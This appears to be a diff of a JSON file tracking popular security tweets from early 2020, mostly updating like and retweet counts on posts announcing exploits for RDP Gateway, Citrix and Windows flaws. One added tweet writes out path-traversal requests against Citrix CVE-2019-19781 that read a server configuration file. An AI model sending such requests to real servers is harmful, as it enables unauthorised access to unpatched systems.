@@ -58,10 +58,10 @@
     "username": "pozdnychev"
 }
 {
-    "tweetfavorites": 2975,
-    "tweetquotes": 52,
-    "tweetreplies": 51,
-    "tweetretweets": 1014,
+    "tweetfavorites": 2796,
+    "tweetquotes": 46,
+    "tweetreplies": 52,
+    "tweetretweets": 933,
     "tweettext": "Ladies and gentlemen, I present you a working Remote Code Execution (RCE) exploit for the Remote Desktop Gateway (CVE-2020-0609 &amp; CVE-2020-0610). Accidentally followed a few rabbit holes but got it to work! Time to write a blog post ;)\n\nDon't forget to patch! https://t.co/FekupjS6qG",
     "tweettime": "2020-01-26, 19:24:46",
     "tweeturl": "https://twitter.com/layle_ctf/status/1221514332049113095",
@@ -283,10 +283,10 @@
     "expanded_url": [
         "https://github.com/ollypwn/cve-2020-0601"
     ],
-    "tweetfavorites": 525,
+    "tweetfavorites": 511,
     "tweetquotes": 4,
     "tweetreplies": 5,
-    "tweetretweets": 297,
+    "tweetretweets": 291,
     "tweettext": "CVE-2020-0601 - PoC for code signing PE files using a Certificate Authority using ECC https://t.co/pPtW5IRa3Y https://t.co/QKIaWrRQFL",
     "tweettime": "2020-01-16, 02:12:56",
     "tweeturl": "https://twitter.com/ch3tanK/status/1217630785634631680",
@@ -442,10 +442,10 @@
         "http://newbm.pl",
         "http://rmbm.pl"
     ],
-    "tweetfavorites": 764,
+    "tweetfavorites": 736,
     "tweetquotes": 16,
     "tweetreplies": 12,
-    "tweetretweets": 375,
+    "tweetretweets": 355,
     "tweettext": "Update CVE-2019-19781\n\nYou can exploit the vulnerability without the file https://t.co/HwA04i1qfJ and only use the file https://t.co/PJ0l4BRdXN !\n\nYou can inject your payload inside the name of the XML file and fire the command execution ! 🔥💪\n\n#shitrix #citrix https://t.co/g2P1GAJo1R",
     "tweettime": "2020-01-13, 18:20:33",
     "tweeturl": "https://twitter.com/mpgn_x64/status/1216787131210829826",
@@ -551,7 +551,7 @@
     "expanded_url": [
         "https://support.citrix.com/article/CTX267679"
     ],
-    "tweetfavorites": 84,
+    "tweetfavorites": 85,
     "tweetquotes": 3,
     "tweetreplies": 2,
     "tweetretweets": 52,
@@ -609,6 +609,16 @@
     "username": "ITSecurityguard"
 }
 {
+    "tweetfavorites": 469,
+    "tweetquotes": 8,
+    "tweetreplies": 8,
+    "tweetretweets": 199,
+    "tweettext": "CVE-2019-19781 Citrix path traversal base on vpns folder\n\nExample:\nGET /vpn/../vpns/services.html\nGET /vpn/../vpns/cfg/smb.conf\n\npatch &gt;&gt; HTTP/1.1 403 Forbidden\nno patch &gt;&gt; HTTP/1.1 200 OK\n\n[global]\nencrypt passwords = yes\nname resolve order = lmhosts wins host bcast https://t.co/a6ehfTRIaJ",
+    "tweettime": "2020-01-08, 12:18:10",
+    "tweeturl": "https://twitter.com/jas502n/status/1214883994086465536",
+    "username": "jas502n"
+}
+{
     "expanded_url": [
         "https://labs.bluefrostsecurity.de/blog/2020/01/07/cve-2019-1215-analysis-of-a-use-after-free-in-ws2ifsl/"
     ],
@@ -638,10 +648,10 @@
     "expanded_url": [
         "https://github.com/0vercl0k/stuffz/blob/master/CVE-2019-1184/CVE-2019-1184.cc"
     ],
-    "tweetfavorites": 421,
+    "tweetfavorites": 409,
     "tweetquotes": 5,
     "tweetreplies": 3,
-    "tweetretweets": 220,
+    "tweetretweets": 215,
     "tweettext": "Here is an exploit for LPE CVE-2019-1184 in case anybody else is interested in this cool bug: https://t.co/PmAFAj1HV0 https://t.co/Osr4Rk2V8z",
     "tweettime": "2020-01-03, 17:57:14",
     "tweeturl": "https://twitter.com/0vercl0k/status/1213157383884570624",
